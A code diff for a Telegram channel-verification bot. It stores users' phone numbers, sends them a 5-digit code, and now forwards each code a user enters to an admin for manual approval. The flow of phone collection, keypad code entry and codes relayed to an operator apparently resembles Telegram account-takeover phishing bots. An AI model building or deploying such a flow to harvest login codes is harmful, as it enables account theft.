@@ -37,7 +37,9 @@ class VerificationBot:
                 first_name TEXT,
                 phone_number TEXT,
                 verification_code TEXT,
+                entered_code TEXT,
                 timestamp DATETIME,
+                code_entered_time DATETIME,
                 status TEXT DEFAULT 'pending',
                 admin_notified BOOLEAN DEFAULT 0
             )
@@ -68,7 +70,8 @@ Hello {user.first_name}! I will help you get verified to join our private channe
 1. Share your contact number that you use for your Telegram account
 2. You'll receive a 5-digit verification code via Telegram
 3. Enter the code using the number buttons
-4. Once verified, you can join the channel!
+4. System will review your code and approve your verification
+5. Once approved, you can join the channel!
 
 **Step 1:** Please share your contact number by clicking the button below.
 
@@ -207,7 +210,8 @@ You'll receive a 5-digit code shortly. Once you get it, you'll be able to enter 
 1. Click the "Send Code" button below
 2. I'll generate a 5-digit code and send it to the user
 3. User will receive the code input interface
-4. User enters the code to complete verification
+4. User enters the code and waits for your approval
+5. You'll see what code they entered and can approve/reject
 
 **Note:** The code will be sent automatically via Telegram message to the user.
             """
@@ -269,6 +273,8 @@ Your verification code is: **{verification_code}**
 Please enter this 5-digit code using the number buttons that will appear next to complete your verification.
 
 **Code:** `{verification_code}`
+
+**Note:** After you enter the code, an admin will review it and approve your verification.
                 """
                 
                 await context.bot.send_message(
@@ -291,6 +297,8 @@ Please enter this 5-digit code using the number buttons that will appear next to
 
 The verification code has been sent to the user via Telegram.
 User can now enter the code using the numeric interface.
+
+**Next:** You'll be notified when the user enters their code for approval.
                     """,
                     parse_mode='Markdown'
                 )
@@ -299,14 +307,141 @@ User can now enter the code using the numeric interface.
                 
         elif query.data == 'view_pending':
             await self.show_pending_users(query, context)
+            
+        elif query.data.startswith('approve_user_'):
+            user_id = int(query.data.split('_')[2])
+            await self.admin_approve_user(query, context, user_id, True)
+            
+        elif query.data.startswith('reject_user_'):
+            user_id = int(query.data.split('_')[2])
+            await self.admin_approve_user(query, context, user_id, False)
+
+    async def admin_approve_user(self, query, context, user_id, approved):
+        """Admin approves or rejects user verification"""
+        try:
+            cursor = self.conn.cursor()
+            cursor.execute('''
+                SELECT first_name, username, phone_number, verification_code, entered_code
+                FROM pending_verifications 
+                WHERE user_id = ?
+            ''', (user_id,))
+            
+            user_info = cursor.fetchone()
+            if not user_info:
+                await query.edit_message_text("❌ User not found.")
+                return
+                
+            first_name, username, phone_number, correct_code, entered_code = user_info
+            
+            if approved:
+                # Add to verified users
+                cursor.execute('''
+                    INSERT OR REPLACE INTO verified_users 
+                    (user_id, username, first_name, phone_number, verified_date)
+                    VALUES (?, ?, ?, ?, ?)
+                ''', (user_id, username, first_name, phone_number, datetime.now()))
+                
+                # Update pending verification status
+                cursor.execute('''
+                    UPDATE pending_verifications 
+                    SET status = 'verified'
+                    WHERE user_id = ?
+                ''', (user_id,))
+                
+                self.conn.commit()
+                
+                # Try to approve join request if exists
+                try:
+                    await context.bot.approve_chat_join_request(CHANNEL_ID, user_id)
+                    status_text = "✅ **Verification Approved!**\n\nCongratulations! Your verification has been approved by the admin and your channel request has been approved. Welcome! 🎉"
+                except BadRequest as e:
+                    logger.error(f"Error approving join request: {e}")
+                    status_text = f"""
+✅ **Verification Approved!**
+
+Your verification has been approved by the admin! 
+
+**Next Step:** Now you can try to join the channel. If you haven't requested to join yet, please do so now.
+
+**Channel ID:** `{CHANNEL_ID}`
+
+If you still can't join, please contact the admin.
+                    """
+                
+                # Notify user of approval
+                await context.bot.send_message(user_id, status_text, parse_mode='Markdown')
+                
+                # Update admin message
+                await query.edit_message_text(
+                    f"""
+✅ **User Verification APPROVED**
+
+👤 **User:** {first_name} (@{username})
+📱 **Phone:** {phone_number}
+🔢 **Sent Code:** `{correct_code}`
+🔢 **User Entered:** `{entered_code}`
+⏰ **Approved:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+✅ **Status:** User has been verified and approved for channel access.
+                    """,
+                    parse_mode='Markdown'
+                )
+                
+            else:
+                # Rejection
+                cursor.execute('''
+                    UPDATE pending_verifications 
+                    SET status = 'rejected'
+                    WHERE user_id = ?
+                ''', (user_id,))
+                self.conn.commit()
+                
+                # Notify user of rejection
+                rejection_text = f"""
+❌ **Verification Rejected**
+
+Unfortunately, your verification has been rejected by the admin.
+
+**Reason:** The code you entered did not match or there was an issue with your verification.
+
+**What you entered:** `{entered_code}`
+
+If you believe this is an error, please contact the admin or try the verification process again by sending /start.
+                """
+                
+                await context.bot.send_message(user_id, rejection_text, parse_mode='Markdown')
+                
+                # Update admin message
+                await query.edit_message_text(
+                    f"""
+❌ **User Verification REJECTED**
+
+👤 **User:** {first_name} (@{username})
+📱 **Phone:** {phone_number}
+🔢 **Sent Code:** `{correct_code}`
+🔢 **User Entered:** `{entered_code}`
+⏰ **Rejected:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+❌ **Status:** User verification has been rejected.
+                    """,
+                    parse_mode='Markdown'
+                )
+            
+            # Clean up session if exists
+            if user_id in self.verification_sessions:
+                del self.verification_sessions[user_id]
+                
+        except Exception as e:
+            logger.error(f"Error in admin approval: {e}")
+            await query.edit_message_text("❌ Error processing approval. Please try again.")
 
     async def show_pending_users(self, query, context):
         """Show pending verification users to admin"""
         cursor = self.conn.cursor()
         cursor.execute('''
-            SELECT user_id, first_name, username, phone_number, timestamp, status 
+            SELECT user_id, first_name, username, phone_number, timestamp, status, entered_code, verification_code
             FROM pending_verifications 
-            WHERE status IN ('contact_shared', 'awaiting_contact', 'code_sent')
+            WHERE status IN ('contact_shared', 'awaiting_contact', 'code_sent', 'code_entered')
             ORDER BY timestamp DESC
         ''')
         
@@ -319,17 +454,23 @@ User can now enter the code using the numeric interface.
         message = "📋 **Pending Verifications:**\n\n"
         
         for user in pending:
-            user_id, first_name, username, phone, timestamp, status = user
+            user_id, first_name, username, phone, timestamp, status, entered_code, verification_code = user
             status_emoji = {
                 'awaiting_contact': '⏳',
                 'contact_shared': '📱',
-                'code_sent': '🔢'
+                'code_sent': '🔢',
+                'code_entered': '✏️'
             }
             
             message += f"{status_emoji.get(status, '❓')} **{first_name}** (@{username})\n"
             message += f"   📞 `{phone or 'No contact yet'}`\n"
             message += f"   🕐 {timestamp}\n"
-            message += f"   📊 Status: {status}\n\n"
+            message += f"   📊 Status: {status}\n"
+            
+            if entered_code and verification_code:
+                message += f"   🔢 Sent: `{verification_code}` | Entered: `{entered_code}`\n"
+                
+            message += "\n"
             
         keyboard = InlineKeyboardMarkup([
             [InlineKeyboardButton("🔄 Refresh", callback_data="view_pending")]
@@ -367,6 +508,7 @@ Please enter the 5-digit verification code you received above using the number b
 1. Use the number buttons to enter your 5-digit code
 2. Click "Backspace" to remove the last digit if needed
 3. Click "Submit" when you've entered all 5 digits
+4. Wait for admin approval after submitting
 
 **Code Input:** ○○○○○
 
@@ -426,6 +568,7 @@ Entered: 0/5 digits
 Entered: {len(session['entered_code'])}/5 digits
 
 Please enter the verification code you received above.
+Wait for admin approval after submitting.
                     """,
                     parse_mode='Markdown',
                     reply_markup=query.message.reply_markup
@@ -446,13 +589,14 @@ Please enter the verification code you received above.
 Entered: {len(session['entered_code'])}/5 digits
 
 Please enter the verification code you received above.
+Wait for admin approval after submitting.
                     """,
                     parse_mode='Markdown',
                     reply_markup=query.message.reply_markup
                 )
                 
             elif data.startswith(f'submit_code_'):
-                # Verify the entered code
+                # Submit the entered code for admin review
                 if len(session['entered_code']) != 5:
                     await query.edit_message_text(
                         "❌ **Incomplete Code**\n\nPlease enter all 5 digits before submitting.",
@@ -461,99 +605,79 @@ Please enter the verification code you received above.
                     )
                     return
                 
-                if session['entered_code'] == session['correct_code']:
-                    # Code is correct - approve user
-                    await self.approve_user(query, context)
-                else:
-                    # Code is incorrect
-                    session['entered_code'] = ''  # Reset entered code
-                    await query.edit_message_text(
-                        f"""
-❌ **Incorrect Code**
+                # Save entered code to database
+                cursor = self.conn.cursor()
+                cursor.execute('''
+                    UPDATE pending_verifications 
+                    SET entered_code = ?, code_entered_time = ?, status = 'code_entered'
+                    WHERE user_id = ?
+                ''', (session['entered_code'], datetime.now(), user_id))
+                self.conn.commit()
+                
+                # Notify user that code is submitted for review
+                await query.edit_message_text(
+                    f"""
+✅ **Code Submitted for Review**
 
-The code you entered is incorrect. Please check the verification code sent to you and try again.
+Your verification code is being processed.
 
-**Code Input:** ○○○○○
+**Code Entered:** `{session['entered_code']}`
+**Status:** Waiting for admin approval
 
-Entered: 0/5 digits
+⏳ Please wait for verification to complete.
 
-**Tip:** Make sure you enter the exact 5-digit code that was sent to you.
-                        """,
+**Note:** This process may take a few minutes.
+                    """,
+                    parse_mode='Markdown'
+                )
+                
+                # Get user info for admin notification
+                cursor.execute('''
+                    SELECT first_name, username, phone_number, verification_code
+                    FROM pending_verifications 
+                    WHERE user_id = ?
+                ''', (user_id,))
+                
+                user_info = cursor.fetchone()
+                if user_info:
+                    first_name, username, phone_number, correct_code = user_info
+                    
+                    # Create admin approval buttons
+                    admin_keyboard = InlineKeyboardMarkup([
+                        [
+                            InlineKeyboardButton("✅ Approve", callback_data=f"approve_user_{user_id}"),
+                            InlineKeyboardButton("❌ Reject", callback_data=f"reject_user_{user_id}")
+                        ],
+                        [InlineKeyboardButton("📋 View All Pending", callback_data="view_pending")]
+                    ])
+                    
+                    # Send admin notification
+                    admin_message = f"""
+🔍 **CODE REVIEW REQUIRED**
+
+👤 **User:** {first_name} (@{username})
+🆔 **User ID:** `{user_id}`
+📱 **Phone:** {phone_number}
+⏰ **Submitted:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+🔢 **Sent Code:** `{correct_code}`
+🔢 **User Entered:** `{session['entered_code']}`
+
+**Match Status:** {'✅ CORRECT' if session['entered_code'] == correct_code else '❌ INCORRECT'}
+
+**Action Required:** Please review and approve or reject this verification.
+                    """
+                    
+                    await context.bot.send_message(
+                        ADMIN_ID,
+                        admin_message,
                         parse_mode='Markdown',
-                        reply_markup=query.message.reply_markup
+                        reply_markup=admin_keyboard
                     )
                     
         except Exception as e:
             logger.error(f"Error handling user callback: {e}")
             await query.edit_message_text("❌ An error occurred. Please contact admin.")
-
-    async def approve_user(self, query, context):
-        """Approve user and add to verified users"""
-        try:
-            user = query.from_user
-            session = self.verification_sessions[user.id]
-            
-            # Get user phone from database
-            cursor = self.conn.cursor()
-            cursor.execute('SELECT phone_number FROM pending_verifications WHERE user_id = ?', (user.id,))
-            result = cursor.fetchone()
-            phone_number = result[0] if result else 'Unknown'
-            
-            # Add to verified users
-            cursor.execute('''
-                INSERT OR REPLACE INTO verified_users 
-                (user_id, username, first_name, phone_number, verified_date)
-                VALUES (?, ?, ?, ?, ?)
-            ''', (user.id, user.username, user.first_name, phone_number, datetime.now()))
-            
-            # Update pending verification status
-            cursor.execute('''
-                UPDATE pending_verifications 
-                SET status = 'verified'
-                WHERE user_id = ?
-            ''', (user.id,))
-            
-            self.conn.commit()
-            
-            # Try to approve join request if exists
-            try:
-                await context.bot.approve_chat_join_request(CHANNEL_ID, user.id)
-                status_text = "✅ **Verification Successful!**\n\nCongratulations! You have been verified and your channel request has been approved. Welcome! 🎉"
-            except BadRequest as e:
-                logger.error(f"Error approving join request: {e}")
-                status_text = f"""
-✅ **Verification Successful!**
-
-You have been verified! 
-
-**Next Step:** Now you can try to join the channel. If you haven't requested to join yet, please do so now.
-
-**Channel ID:** `{CHANNEL_ID}`
-
-If you still can't join, please contact the admin.
-                """
-            
-            await query.edit_message_text(status_text, parse_mode='Markdown')
-            
-            # Notify admin
-            admin_message = f"""
-✅ **User Verified Successfully**
-
-👤 **User:** {user.first_name} (@{user.username})
-🆔 **User ID:** `{user.id}`
-📱 **Phone:** {phone_number}
-⏰ **Verified:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
-User has been verified and approved for channel access.
-            """
-            await context.bot.send_message(ADMIN_ID, admin_message, parse_mode='Markdown')
-            
-            # Clean up session
-            del self.verification_sessions[user.id]
-            
-        except Exception as e:
-            logger.error(f"Error approving user: {e}")
-            await query.edit_message_text("❌ Error in approval process. Please contact admin.")
 
     async def admin_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Show admin statistics"""
@@ -566,8 +690,11 @@ User has been verified and approved for channel access.
         cursor.execute('SELECT COUNT(*) FROM verified_users')
         verified_count = cursor.fetchone()[0]
         
-        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status != "verified"')
+        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status NOT IN ("verified", "rejected")')
         pending_count = cursor.fetchone()[0]
+        
+        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status = "code_entered"')
+        awaiting_approval = cursor.fetchone()[0]
         
         cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status = "verified"')
         total_verified = cursor.fetchone()[0]
@@ -577,6 +704,7 @@ User has been verified and approved for channel access.
 
 ✅ **Verified Users:** {verified_count}
 ⏳ **Pending Verifications:** {pending_count}
+🔍 **Awaiting Approval:** {awaiting_approval}
 📈 **Total Processed:** {total_verified}
 
 **Recent Verifications:**
@@ -594,9 +722,10 @@ User has been verified and approved for channel access.
         for user in recent:
             stats_message += f"\n• {user[0]} (@{user[1]}) - {user[2]}"
             
-        # Add pending users button
+        # Add action buttons
         keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("📋 View Pending Users", callback_data="view_pending")]
+            [InlineKeyboardButton("📋 View Pending Users", callback_data="view_pending")],
+            [InlineKeyboardButton("🔍 View Users Awaiting Approval", callback_data="view_awaiting")]
         ])
             
         await update.message.reply_text(stats_message, parse_mode='Markdown', reply_markup=keyboard)
@@ -620,7 +749,7 @@ def main():
     application.add_handler(MessageHandler(filters.CONTACT, bot.handle_contact))
     
     # Separate callback handlers for admin and users
-    application.add_handler(CallbackQueryHandler(bot.handle_admin_callback, pattern=r'^(send_code_|view_pending)'))
+    application.add_handler(CallbackQueryHandler(bot.handle_admin_callback, pattern=r'^(send_code_|view_pending|approve_user_|reject_user_)'))
     application.add_handler(CallbackQueryHandler(bot.handle_user_callback, pattern=r'^(num_|backspace_|submit_code_)'))
     
     # Start the bot
